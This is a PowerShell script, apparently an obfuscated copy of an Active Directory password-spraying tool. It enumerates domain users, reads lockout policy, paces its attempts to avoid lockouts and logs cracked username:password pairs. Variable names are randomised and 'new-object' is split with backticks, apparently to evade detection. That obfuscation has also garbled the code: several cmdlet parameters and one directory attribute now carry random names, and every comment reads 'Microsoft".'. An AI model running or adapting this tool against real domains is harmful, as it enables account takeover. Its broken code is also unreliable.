function Invoke-DomainPasswordSpray{
    param(
     [Parameter(Position = 0, Mandatory = $false)]
     [string]
     $RrngBHeYNKlBeRotcyvnw = "",

     [Parameter(Position = 1, Mandatory = $false)]
     [string]
     $yZZWOdVtOiPGRmclTbPHVnBMEd,

     [Parameter(Position = 2, Mandatory = $false)]
     [string]
     $HjXsGfXTSvsAyjyPyVWNnhoQNaOQUNknCb,

     [Parameter(Position = 3, Mandatory = $false)]
     [string]
     $JujBZYfgFHhJKyimboqhYgtDhyFJpVXrRqFaXUVrb,

     [Parameter(Position = 4, Mandatory = $false)]
     [string]
     $zsqJGeyPIapTHdcQMKSTVHNmzpxtyGhcYpJPvDo = "",

     [Parameter(Position = 5, Mandatory = $false)]
     [string]
     $VUNqJWGTtyPXqKixyjXmCIFL = "",

     [Parameter(Position = 6, Mandatory = $false)]
     [switch]
     $mDnJIYwLimWCnyFDpmdRyaawzRnO,

     [Parameter(Position = 7, Mandatory = $false)]
     [switch]
     $CzQPaiMVlezHLOsaoSbLGjgOKF,

     [Parameter(Position = 8, Mandatory = $false)]
     [int]
     $kHjZyYzhuvGYjORGkHNzNgWrfjofwJrDIg=0,

     [Parameter(Position = 9, Mandatory = $false)]
     $uDOubCzUPnREBSArGQwMgYfMfHnFmPQyAHDlZ=0,

     [Parameter(Position = 10, Mandatory = $false)]
     [switch]
     $uvVuEMVAxXuSnaLYyrNOCrvPVBYHKTrQZrJqFAbIOQU,

     [Parameter(Position = 11, Mandatory = $false)]
     [int]
     $zthhsVLpCSlDxjpWvbwWiDwNdKGE=10
    )

    if ($yZZWOdVtOiPGRmclTbPHVnBMEd)
    {
        $rINMlxNbhBrfZrMgVZQcJEtLXsdpJBJjAFsgwcLljM = @($yZZWOdVtOiPGRmclTbPHVnBMEd)
    }
    elseif($CzQPaiMVlezHLOsaoSbLGjgOKF)
    {
        $rINMlxNbhBrfZrMgVZQcJEtLXsdpJBJjAFsgwcLljM = ""
    }
    elseif($HjXsGfXTSvsAyjyPyVWNnhoQNaOQUNknCb)
    {
        $rINMlxNbhBrfZrMgVZQcJEtLXsdpJBJjAFsgwcLljM = Get-Content $HjXsGfXTSvsAyjyPyVWNnhoQNaOQUNknCb
    }
    else
    {
        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor Red "The -yZZWOdVtOiPGRmclTbPHVnBMEd or -HjXsGfXTSvsAyjyPyVWNnhoQNaOQUNknCb option must be specified"
        break
    }

    try
    {
        if ($VUNqJWGTtyPXqKixyjXmCIFL -ne "")
        {
            # Microsoft".
            $RFIoCufzUEecdWkfgEKLGsenOsTlXLsWNvB = ne`w`-ob`je`ct System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$VUNqJWGTtyPXqKixyjXmCIFL)
            $YKYoiBMUpUVQcIBhXmWmRxKswp = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($RFIoCufzUEecdWkfgEKLGsenOsTlXLsWNvB)
            $gTjRcuUzdknrotjviqCbnPR = "LDAP://" + ([ADSI]"LDAP://$VUNqJWGTtyPXqKixyjXmCIFL").distinguishedName
        }
        else
        {
            # Microsoft".
            $YKYoiBMUpUVQcIBhXmWmRxKswp = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $gTjRcuUzdknrotjviqCbnPR = "LDAP://" + ([ADSI]"").distinguishedName
        }
    }
    catch
    {
        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor "red" "[*] Could not connect to the domain. Try specifying the domain name with the -VUNqJWGTtyPXqKixyjXmCIFL option."
        break
    }

    if ($RrngBHeYNKlBeRotcyvnw -eq "")
    {
        $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP = Get-DomainUserList -VUNqJWGTtyPXqKixyjXmCIFL $VUNqJWGTtyPXqKixyjXmCIFL -ZHezMTeanWONTJTKZKMFHkwsHcMSu -izThjGSxBeDGVIiKsZugyiOPOGCNNReunEP -zsqJGeyPIapTHdcQMKSTVHNmzpxtyGhcYpJPvDo $zsqJGeyPIapTHdcQMKSTVHNmzpxtyGhcYpJPvDo
    }
    else
    {
        # Microsoft".
        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh "[*] Using $RrngBHeYNKlBeRotcyvnw as userlist to spray with"
        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor "yellow" "[*] Warning: Users will not be checked for lockout threshold."
        $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP = @()
        try
        {
            $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP = Get-Content $RrngBHeYNKlBeRotcyvnw -ErrorAction stop
        }
        catch [Exception]
        {
            Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor "red" "$_.Exception"
            break
        }

    }


    if ($rINMlxNbhBrfZrMgVZQcJEtLXsdpJBJjAFsgwcLljM.count -gt 1)
    {
        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"
    }

    $wXvoGCngektZSlKgLEgqTLcJQrfgAFvATSBVVbpJOSF = Get-ObservationWindow $gTjRcuUzdknrotjviqCbnPR

    Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor Yellow "[*] The domain password policy observation window is set to $wXvoGCngektZSlKgLEgqTLcJQrfgAFvATSBVVbpJOSF minutes."
    Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh "[*] Setting a $wXvoGCngektZSlKgLEgqTLcJQrfgAFvATSBVVbpJOSF minute wait in between sprays."

    # Microsoft".
    if (!$mDnJIYwLimWCnyFDpmdRyaawzRnO)
    {
        $VAYoyIXHmQZfoKkOOozpXts = "Confirm Password Spray"
        $ugJigYmlqssxIULHayTzJGjbtOowqfchgtsxB = "Are you sure you want to perform a password spray against " + $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP.count + " accounts?"

        $ntIYbgSsoFFGksqBBHRjfoXnAjDzvFipznvhHk = ne`w`-ob`je`ct System.Management.Automation.Host.ChoiceDescription "&Yes", `
            "Attempts to authenticate 1 time per user in the list for each password in the passwordlist file."

        $mezoilHxCxpsYmuUqCPwdaejmxyQcgQbUMaa = ne`w`-ob`je`ct System.Management.Automation.Host.ChoiceDescription "&No", `
            "Cancels the password spray."

        $XaMpWmwJCGXCMTEClMdi = [System.Management.Automation.Host.ChoiceDescription[]]($ntIYbgSsoFFGksqBBHRjfoXnAjDzvFipznvhHk, $mezoilHxCxpsYmuUqCPwdaejmxyQcgQbUMaa)

        $otpFCGgGDlKjDAJgIMrEixueNMfesoXvugfyqtw = $sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh.ui.PromptForChoice($VAYoyIXHmQZfoKkOOozpXts, $ugJigYmlqssxIULHayTzJGjbtOowqfchgtsxB, $XaMpWmwJCGXCMTEClMdi, 0)

        if ($otpFCGgGDlKjDAJgIMrEixueNMfesoXvugfyqtw -ne 0)
        {
            Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh "Cancelling the password spray."
            break
        }
    }
    Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor Yellow "[*] Password spraying has begun with " $rINMlxNbhBrfZrMgVZQcJEtLXsdpJBJjAFsgwcLljM.count " passwords"
    Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh "[*] This might take a while depending on the total number of users"

    if($CzQPaiMVlezHLOsaoSbLGjgOKF)
    {
        Invoke-SpraySinglePassword -VUNqJWGTtyPXqKixyjXmCIFL $gTjRcuUzdknrotjviqCbnPR -UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP -JujBZYfgFHhJKyimboqhYgtDhyFJpVXrRqFaXUVrb $JujBZYfgFHhJKyimboqhYgtDhyFJpVXrRqFaXUVrb -kHjZyYzhuvGYjORGkHNzNgWrfjofwJrDIg $kHjZyYzhuvGYjORGkHNzNgWrfjofwJrDIg -uDOubCzUPnREBSArGQwMgYfMfHnFmPQyAHDlZ $uDOubCzUPnREBSArGQwMgYfMfHnFmPQyAHDlZ -CzQPaiMVlezHLOsaoSbLGjgOKF -uvVuEMVAxXuSnaLYyrNOCrvPVBYHKTrQZrJqFAbIOQU $uvVuEMVAxXuSnaLYyrNOCrvPVBYHKTrQZrJqFAbIOQU
    }
    else
    {
        for($tZUHyesMmrudRpxfdQKGpCcYFOjYLwhPvRvcmZ = 0; $tZUHyesMmrudRpxfdQKGpCcYFOjYLwhPvRvcmZ -lt $rINMlxNbhBrfZrMgVZQcJEtLXsdpJBJjAFsgwcLljM.count; $tZUHyesMmrudRpxfdQKGpCcYFOjYLwhPvRvcmZ++)
        {
            Invoke-SpraySinglePassword -VUNqJWGTtyPXqKixyjXmCIFL $gTjRcuUzdknrotjviqCbnPR -UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP -yZZWOdVtOiPGRmclTbPHVnBMEd $rINMlxNbhBrfZrMgVZQcJEtLXsdpJBJjAFsgwcLljM[$tZUHyesMmrudRpxfdQKGpCcYFOjYLwhPvRvcmZ] -JujBZYfgFHhJKyimboqhYgtDhyFJpVXrRqFaXUVrb $JujBZYfgFHhJKyimboqhYgtDhyFJpVXrRqFaXUVrb -kHjZyYzhuvGYjORGkHNzNgWrfjofwJrDIg $kHjZyYzhuvGYjORGkHNzNgWrfjofwJrDIg -uDOubCzUPnREBSArGQwMgYfMfHnFmPQyAHDlZ $uDOubCzUPnREBSArGQwMgYfMfHnFmPQyAHDlZ -uvVuEMVAxXuSnaLYyrNOCrvPVBYHKTrQZrJqFAbIOQU $uvVuEMVAxXuSnaLYyrNOCrvPVBYHKTrQZrJqFAbIOQU
            if (($tZUHyesMmrudRpxfdQKGpCcYFOjYLwhPvRvcmZ+1) -lt $rINMlxNbhBrfZrMgVZQcJEtLXsdpJBJjAFsgwcLljM.count)
            {
                Countdown-Timer -MKYrXEZuOczNIXEksnpqPeRQDrxx (60*$wXvoGCngektZSlKgLEgqTLcJQrfgAFvATSBVVbpJOSF + $zthhsVLpCSlDxjpWvbwWiDwNdKGE) -uvVuEMVAxXuSnaLYyrNOCrvPVBYHKTrQZrJqFAbIOQU $uvVuEMVAxXuSnaLYyrNOCrvPVBYHKTrQZrJqFAbIOQU
            }
        }
    }

    Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor Yellow "[*] Password spraying is complete"
    if ($JujBZYfgFHhJKyimboqhYgtDhyFJpVXrRqFaXUVrb -ne "")
    {
        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $JujBZYfgFHhJKyimboqhYgtDhyFJpVXrRqFaXUVrb"
    }
}

function Countdown-Timer
{
    param(
        $MKYrXEZuOczNIXEksnpqPeRQDrxx = 1800,
        $ugJigYmlqssxIULHayTzJGjbtOowqfchgtsxB = "[*] Pausing to avoid account lockout.",
        [switch] $uvVuEMVAxXuSnaLYyrNOCrvPVBYHKTrQZrJqFAbIOQU = $False
    )
    if ($uvVuEMVAxXuSnaLYyrNOCrvPVBYHKTrQZrJqFAbIOQU)
    {
        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh "$ugJigYmlqssxIULHayTzJGjbtOowqfchgtsxB: Waiting for $($MKYrXEZuOczNIXEksnpqPeRQDrxx/60) minutes. $($MKYrXEZuOczNIXEksnpqPeRQDrxx - $UzoiTutuPrrkrFRULUMXvg)"
        Start-Sleep -MKYrXEZuOczNIXEksnpqPeRQDrxx $MKYrXEZuOczNIXEksnpqPeRQDrxx
    } else {
        foreach ($UzoiTutuPrrkrFRULUMXvg in (1..$MKYrXEZuOczNIXEksnpqPeRQDrxx))
        {
            Write-Progress -Id 1 -Activity $ugJigYmlqssxIULHayTzJGjbtOowqfchgtsxB -Status "Waiting for $($MKYrXEZuOczNIXEksnpqPeRQDrxx/60) minutes. $($MKYrXEZuOczNIXEksnpqPeRQDrxx - $UzoiTutuPrrkrFRULUMXvg) seconds remaining" -PercentComplete (($UzoiTutuPrrkrFRULUMXvg / $MKYrXEZuOczNIXEksnpqPeRQDrxx) * 100)
            Start-Sleep -MKYrXEZuOczNIXEksnpqPeRQDrxx 1
        }
        Write-Progress -Id 1 -Activity $ugJigYmlqssxIULHayTzJGjbtOowqfchgtsxB -Status "Completed" -PercentComplete 100 -Completed
    }
}

function Get-DomainUserList
{
    param(
     [Parameter(Position = 0, Mandatory = $false)]
     [string]
     $VUNqJWGTtyPXqKixyjXmCIFL = "",

     [Parameter(Position = 1, Mandatory = $false)]
     [switch]
     $ZHezMTeanWONTJTKZKMFHkwsHcMSu,

     [Parameter(Position = 2, Mandatory = $false)]
     [switch]
     $izThjGSxBeDGVIiKsZugyiOPOGCNNReunEP,

     [Parameter(Position = 3, Mandatory = $false)]
     [string]
     $zsqJGeyPIapTHdcQMKSTVHNmzpxtyGhcYpJPvDo
    )

    try
    {
        if ($VUNqJWGTtyPXqKixyjXmCIFL -ne "")
        {
            # Microsoft".
            $RFIoCufzUEecdWkfgEKLGsenOsTlXLsWNvB = ne`w`-ob`je`ct System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$VUNqJWGTtyPXqKixyjXmCIFL)
            $YKYoiBMUpUVQcIBhXmWmRxKswp =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($RFIoCufzUEecdWkfgEKLGsenOsTlXLsWNvB)
            $gTjRcuUzdknrotjviqCbnPR = "LDAP://" + ([ADSI]"LDAP://$VUNqJWGTtyPXqKixyjXmCIFL").distinguishedName
        }
        else
        {
            # Microsoft".
            $YKYoiBMUpUVQcIBhXmWmRxKswp =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $gTjRcuUzdknrotjviqCbnPR = "LDAP://" + ([ADSI]"").distinguishedName
        }
    }
    catch
    {
        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -VUNqJWGTtyPXqKixyjXmCIFL option."
        break
    }

    # Microsoft".
    $MEfxDQMXheWBjXfeWDccxh = [ADSI] "LDAP://$($YKYoiBMUpUVQcIBhXmWmRxKswp.PDCRoleOwner)"
    $kYHTdtRQTpJSdwArlXVUvLpyhTRNhRKi = @()
    $kYHTdtRQTpJSdwArlXVUvLpyhTRNhRKi += $MEfxDQMXheWBjXfeWDccxh.Properties.lockoutthreshold

    # Microsoft".
    $GKdwYHfTXDNjSrvrMkfJAxpKSuQtmkABDRLjBgTv = [int] $MEfxDQMXheWBjXfeWDccxh.Properties['msds-behavior-version'].item(0)
    if ($GKdwYHfTXDNjSrvrMkfJAxpKSuQtmkABDRLjBgTv -ge 3)
    {
        # Microsoft".
        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh "[*] Current domain is compatible with Fine-Grained Password Policy."
        $YlzWDNrHPtvrqZhtuhzWoCKqgWcnDtsTRu = ne`w`-ob`je`ct System.DirectoryServices.DirectorySearcher
        $YlzWDNrHPtvrqZhtuhzWoCKqgWcnDtsTRu.SearchRoot = $MEfxDQMXheWBjXfeWDccxh
        $YlzWDNrHPtvrqZhtuhzWoCKqgWcnDtsTRu.Filter = "(objectclass=msDS-PasswordSettings)"
        $cXtWErHvcpSDbeqqeFHENyj = $YlzWDNrHPtvrqZhtuhzWoCKqgWcnDtsTRu.FindAll()

        if ( $cXtWErHvcpSDbeqqeFHENyj.count -gt 0)
        {
            Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -foregroundcolor "yellow" ("[*] A total of " + $cXtWErHvcpSDbeqqeFHENyj.count + " Fine-Grained Password policies were found.`r`n")
            foreach($ETHGVqpCGRLXpOgGsyQKJCdyvNtPodBGCQxKAinI in $cXtWErHvcpSDbeqqeFHENyj)
            {
                # Microsoft".
                # Microsoft".
                $iAkmCXyiqPVudHqhrmgWYfSzVvFHWvfBoqZ = $ETHGVqpCGRLXpOgGsyQKJCdyvNtPodBGCQxKAinI | Select-Object -ExpandProperty Properties
                $IlVSakNEsvJcJAVZCxIc = $iAkmCXyiqPVudHqhrmgWYfSzVvFHWvfBoqZ.name
                $ETTMYrheYqKKAAdLBMtAvWspROnNIdFOszUCBpyz = $iAkmCXyiqPVudHqhrmgWYfSzVvFHWvfBoqZ.'msds-lockoutthreshold'
                $KFnGuVrXWSlAKIxIOSWqLRrZjtNHHg = $iAkmCXyiqPVudHqhrmgWYfSzVvFHWvfBoqZ.'msds-KFnGuVrXWSlAKIxIOSWqLRrZjtNHHg'
                $LLFsUMGHvqKKJINwZHPAwAcKiseAZIT = $iAkmCXyiqPVudHqhrmgWYfSzVvFHWvfBoqZ.'msds-minimumpasswordlength'
                # Microsoft".
                $kYHTdtRQTpJSdwArlXVUvLpyhTRNhRKi += $ETTMYrheYqKKAAdLBMtAvWspROnNIdFOszUCBpyz

                Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh "[*] Fine-Grained Password Policy titled: $IlVSakNEsvJcJAVZCxIc has a Lockout Threshold of $ETTMYrheYqKKAAdLBMtAvWspROnNIdFOszUCBpyz attempts, minimum password length of $LLFsUMGHvqKKJINwZHPAwAcKiseAZIT chars, and applies to $KFnGuVrXWSlAKIxIOSWqLRrZjtNHHg.`r`n"
            }
        }
    }

    $wXvoGCngektZSlKgLEgqTLcJQrfgAFvATSBVVbpJOSF = Get-ObservationWindow $gTjRcuUzdknrotjviqCbnPR

    # Microsoft".
    # Microsoft".
    # Microsoft".
    [int]$ucpOLyHmtPTkuRlQRTXbSvp = $kYHTdtRQTpJSdwArlXVUvLpyhTRNhRKi | sort | Select -First 1
    Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor "yellow" "[*] Now creating a list of users to spray..."

    if ($ucpOLyHmtPTkuRlQRTXbSvp -eq "0")
    {
        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor "Yellow" "[*] There appears to be no lockout policy."
    }
    else
    {
        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor "Yellow" "[*] The smallest lockout threshold discovered in the domain is $ucpOLyHmtPTkuRlQRTXbSvp login attempts."
    }

    $QTqfzDjRPWjWfTvaipcqYYxAbTMP = ne`w`-ob`je`ct System.DirectoryServices.DirectorySearcher([ADSI]$gTjRcuUzdknrotjviqCbnPR)
    $QtMRcWERueAptznPUfexKhGbD = ne`w`-ob`je`ct System.DirectoryServices.DirectoryEntry
    $QTqfzDjRPWjWfTvaipcqYYxAbTMP.SearchRoot = $QtMRcWERueAptznPUfexKhGbD

    $QTqfzDjRPWjWfTvaipcqYYxAbTMP.PropertiesToLoad.Add("samaccountname") > $Null
    $QTqfzDjRPWjWfTvaipcqYYxAbTMP.PropertiesToLoad.Add("badpwdcount") > $Null
    $QTqfzDjRPWjWfTvaipcqYYxAbTMP.PropertiesToLoad.Add("badpasswordtime") > $Null

    if ($ZHezMTeanWONTJTKZKMFHkwsHcMSu)
    {
        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor "yellow" "[*] Removing disabled users from list."
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        $QTqfzDjRPWjWfTvaipcqYYxAbTMP.filter =
            "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2)$zsqJGeyPIapTHdcQMKSTVHNmzpxtyGhcYpJPvDo)"
    }
    else
    {
        $QTqfzDjRPWjWfTvaipcqYYxAbTMP.filter = "(&(objectCategory=person)(objectClass=user)$zsqJGeyPIapTHdcQMKSTVHNmzpxtyGhcYpJPvDo)"
    }

    $QTqfzDjRPWjWfTvaipcqYYxAbTMP.PropertiesToLoad.add("samaccountname") > $Null
    $QTqfzDjRPWjWfTvaipcqYYxAbTMP.PropertiesToLoad.add("lockouttime") > $Null
    $QTqfzDjRPWjWfTvaipcqYYxAbTMP.PropertiesToLoad.add("badpwdcount") > $Null
    $QTqfzDjRPWjWfTvaipcqYYxAbTMP.PropertiesToLoad.add("badpasswordtime") > $Null

    # Microsoft".

    # Microsoft".
    $QTqfzDjRPWjWfTvaipcqYYxAbTMP.PageSize = 1000
    $UScKFzKSynKzWrsHWUsdNSCaJvJZQgZiHgtkuMwzWAEq = $QTqfzDjRPWjWfTvaipcqYYxAbTMP.FindAll()
    Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor "yellow" ("[*] There are " + $UScKFzKSynKzWrsHWUsdNSCaJvJZQgZiHgtkuMwzWAEq.count + " total users found.")
    $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP = @()

    if ($izThjGSxBeDGVIiKsZugyiOPOGCNNReunEP)
    {
        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out from list."
        foreach ($TluzWsgkUTwPJXJnVbtRWALeRtaFuMNkqa in $UScKFzKSynKzWrsHWUsdNSCaJvJZQgZiHgtkuMwzWAEq)
        {
            # Microsoft".
            $dCLDlPXWNmXxXygPZVGyazuSuSxWCNkn = $TluzWsgkUTwPJXJnVbtRWALeRtaFuMNkqa.Properties.badpwdcount
            $FyGaEdxjiJvFZRTvwBhDkAjUmNxlfEjlNpXDsIFA = $TluzWsgkUTwPJXJnVbtRWALeRtaFuMNkqa.Properties.samaccountname
            try
            {
                $jYZgTSCLTBEXEvllnGEcYOFD = $TluzWsgkUTwPJXJnVbtRWALeRtaFuMNkqa.Properties.badpasswordtime[0]
            }
            catch
            {
                continue
            }
            $OhzeBykBeGaEIIfmiyWvMpICCxUiCFYdOqMwhEYRtIQqQ = Get-Date
            $NtbwSLIVPXftpBDOkHVOiglvulcRnuWMcGQIhcG = [DateTime]::FromFileTime($jYZgTSCLTBEXEvllnGEcYOFD)
            $ksidMHxkvqBTJlqpugZMeHyeBNoVv = ($OhzeBykBeGaEIIfmiyWvMpICCxUiCFYdOqMwhEYRtIQqQ - $NtbwSLIVPXftpBDOkHVOiglvulcRnuWMcGQIhcG).TotalMinutes

            if ($dCLDlPXWNmXxXygPZVGyazuSuSxWCNkn)
            {
                [int]$dwiIkNqcMJOFKeAsWSTjWpdxkDmCKuWe = [convert]::ToInt32($dCLDlPXWNmXxXygPZVGyazuSuSxWCNkn, 10)
                $utCVGDCThLvgJzgnBJGcLlVjXTi = $ucpOLyHmtPTkuRlQRTXbSvp - $dwiIkNqcMJOFKeAsWSTjWpdxkDmCKuWe
                # Microsoft".
                # Microsoft".
                # Microsoft".
                if (($ksidMHxkvqBTJlqpugZMeHyeBNoVv -gt $wXvoGCngektZSlKgLEgqTLcJQrfgAFvATSBVVbpJOSF) -or ($utCVGDCThLvgJzgnBJGcLlVjXTi -gt 1))
                                {
                    $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP += $FyGaEdxjiJvFZRTvwBhDkAjUmNxlfEjlNpXDsIFA
                }
            }
        }
    }
    else
    {
        foreach ($TluzWsgkUTwPJXJnVbtRWALeRtaFuMNkqa in $UScKFzKSynKzWrsHWUsdNSCaJvJZQgZiHgtkuMwzWAEq)
        {
            $FyGaEdxjiJvFZRTvwBhDkAjUmNxlfEjlNpXDsIFA = $TluzWsgkUTwPJXJnVbtRWALeRtaFuMNkqa.Properties.samaccountname
            $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP += $FyGaEdxjiJvFZRTvwBhDkAjUmNxlfEjlNpXDsIFA
        }
    }

    Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -foregroundcolor "yellow" ("[*] Created a userlist containing " + $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP.count + " users gathered from the current user's domain")
    return $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP
}

function Invoke-SpraySinglePassword
{
    param(
            [Parameter(Position=1)]
            $VUNqJWGTtyPXqKixyjXmCIFL,
            [Parameter(Position=2)]
            [string[]]
            $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP,
            [Parameter(Position=3)]
            [string]
            $yZZWOdVtOiPGRmclTbPHVnBMEd,
            [Parameter(Position=4)]
            [string]
            $JujBZYfgFHhJKyimboqhYgtDhyFJpVXrRqFaXUVrb,
            [Parameter(Position=5)]
            [int]
            $kHjZyYzhuvGYjORGkHNzNgWrfjofwJrDIg=0,
            [Parameter(Position=6)]
            [double]
            $uDOubCzUPnREBSArGQwMgYfMfHnFmPQyAHDlZ=0,
            [Parameter(Position=7)]
            [switch]
            $CzQPaiMVlezHLOsaoSbLGjgOKF,
            [Parameter(Position=7)]
            [switch]
            $uvVuEMVAxXuSnaLYyrNOCrvPVBYHKTrQZrJqFAbIOQU
    )
    $MNDYZafyDCPacRuILnEgznT = Get-Date
    $UzoiTutuPrrkrFRULUMXvg = $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP.count
    Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh "[*] Now trying password $yZZWOdVtOiPGRmclTbPHVnBMEd against $UzoiTutuPrrkrFRULUMXvg users. Current time is $($MNDYZafyDCPacRuILnEgznT.ToShortTimeString())"
    $jSWCQEztnZRNuuUWBKTciUfliWaIvlknMKtwe = 0
    if ($JujBZYfgFHhJKyimboqhYgtDhyFJpVXrRqFaXUVrb -ne ""-and -not $uvVuEMVAxXuSnaLYyrNOCrvPVBYHKTrQZrJqFAbIOQU)
    {
        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor Yellow "[*] Writing successes to $JujBZYfgFHhJKyimboqhYgtDhyFJpVXrRqFaXUVrb"    
    }
    $XHcfKLZlwpTvSBvwCaUTsZWjZSXczzgoGcujvRj = ne`w`-ob`je`ct System.Random

    foreach ($TluzWsgkUTwPJXJnVbtRWALeRtaFuMNkqa in $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP)
    {
        if ($CzQPaiMVlezHLOsaoSbLGjgOKF)
        {
            $yZZWOdVtOiPGRmclTbPHVnBMEd = $TluzWsgkUTwPJXJnVbtRWALeRtaFuMNkqa
        }
        $FsQrixyfdvUtgJzLkGujegdgLPOX = ne`w`-ob`je`ct System.DirectoryServices.DirectoryEntry($VUNqJWGTtyPXqKixyjXmCIFL,$TluzWsgkUTwPJXJnVbtRWALeRtaFuMNkqa,$yZZWOdVtOiPGRmclTbPHVnBMEd)
        if ($FsQrixyfdvUtgJzLkGujegdgLPOX.name -ne $null)
        {
            if ($JujBZYfgFHhJKyimboqhYgtDhyFJpVXrRqFaXUVrb -ne "")
            {
                Add-Content $JujBZYfgFHhJKyimboqhYgtDhyFJpVXrRqFaXUVrb $TluzWsgkUTwPJXJnVbtRWALeRtaFuMNkqa`:$yZZWOdVtOiPGRmclTbPHVnBMEd
            }
            Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor Green "[*] SUCCESS! User:$TluzWsgkUTwPJXJnVbtRWALeRtaFuMNkqa Password:$yZZWOdVtOiPGRmclTbPHVnBMEd"
        }
        $jSWCQEztnZRNuuUWBKTciUfliWaIvlknMKtwe += 1
        if (-not $uvVuEMVAxXuSnaLYyrNOCrvPVBYHKTrQZrJqFAbIOQU)
        {
            Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -nonewline "$jSWCQEztnZRNuuUWBKTciUfliWaIvlknMKtwe of $UzoiTutuPrrkrFRULUMXvg users tested`r"
        }
        if ($kHjZyYzhuvGYjORGkHNzNgWrfjofwJrDIg)
        {
            Start-Sleep -MKYrXEZuOczNIXEksnpqPeRQDrxx $XHcfKLZlwpTvSBvwCaUTsZWjZSXczzgoGcujvRj.Next((1-$uDOubCzUPnREBSArGQwMgYfMfHnFmPQyAHDlZ)*$kHjZyYzhuvGYjORGkHNzNgWrfjofwJrDIg, (1+$uDOubCzUPnREBSArGQwMgYfMfHnFmPQyAHDlZ)*$kHjZyYzhuvGYjORGkHNzNgWrfjofwJrDIg)
        }
    }

}

function Get-ObservationWindow($VsLfmDPxHioScTgupxbfpwILMvaiNvGZwDnLtYZjX)
{
    # Microsoft".
    # Microsoft".
    $TqImTEJVzduriDfBjoQzkEvouHRViIlxxCYfDzFMeAV = $VsLfmDPxHioScTgupxbfpwILMvaiNvGZwDnLtYZjX.Properties['lockoutObservationWindow']
    $wXvoGCngektZSlKgLEgqTLcJQrfgAFvATSBVVbpJOSF = $VsLfmDPxHioScTgupxbfpwILMvaiNvGZwDnLtYZjX.ConvertLargeIntegerToInt64($TqImTEJVzduriDfBjoQzkEvouHRViIlxxCYfDzFMeAV.Value) / -600000000
    return $wXvoGCngektZSlKgLEgqTLcJQrfgAFvATSBVVbpJOSF
}
